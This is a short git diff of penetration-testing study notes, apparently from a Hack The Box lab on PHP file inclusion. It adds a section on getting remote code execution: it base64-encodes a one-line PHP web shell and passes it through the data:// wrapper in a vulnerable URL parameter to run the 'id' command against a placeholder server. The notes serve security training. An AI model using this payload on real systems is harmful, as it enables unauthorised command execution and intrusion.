@@ -20,8 +20,24 @@ Once we have a list of potential PHP files we want to read, we can start disclos
 php://filter/read=convert.base64-encode/resource=config
 ```
 
+# RCE : PHP Wrappers
 
-# Remote File Inclusion
+```bash
+akhmadkun@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' | base64
+
+PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
+```
+
+Now, we can URL encode the base64 string, and then pass it to the data wrapper with `data://text/plain;base64,`.
+
+```
+PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D
+```
+
+```bash
+http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
+```
+# RCE : Remote File Inclusion
 
 ## Verify RFI
 
